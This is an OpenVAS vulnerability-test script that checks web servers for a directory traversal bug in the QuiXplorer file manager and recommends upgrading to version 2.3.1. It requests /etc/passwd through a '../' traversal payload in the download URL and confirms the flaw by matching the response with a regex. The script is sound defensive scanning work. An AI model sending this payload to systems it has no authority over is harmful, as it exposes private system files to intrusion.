# OpenVAS Vulnerability Test
# $Id: quixplorer_file_disclosure.nasl 17 2013-10-27 14:01:43Z jan $
# Description: QuiXplorer Directory Traversal
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host is running the QuiXplorer CGI suite, a file manager
for websites written in PHP.

There is a floaw in the remote version of this CGI which makes it vulnerable 
to a directory traversal bug.  

This could, for instance, lead to an attacker downloading the /etc/passwd file.";

tag_solution = "Upgrade to version 2.3.1 -  http://quixplorer.sourceforge.net/";

# Contact: Cyrille Barthelemy <cb-lse@ifrance.com>
# Subject: QuiXplorer directory traversal
# Date: 	14.8.2004 13:03

if(description)
{
 script_id(14275);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(10949);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_name("QuiXplorer Directory Traversal");
 
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Tests for the QuiXplorer Directory traversal";
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 path = string(dir, "/quixplorer_2_3/index.php?action=download&dir=&item=../../../../../../../../../etc/passwd&order=name&srt=yes");
 req = http_get(item: path, port:port);

 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);

 if ( egrep ( pattern:".*root:.*:0:[01]:.*", string:res) )
 {
	security_hole(port);
	exit(0);
 }
}

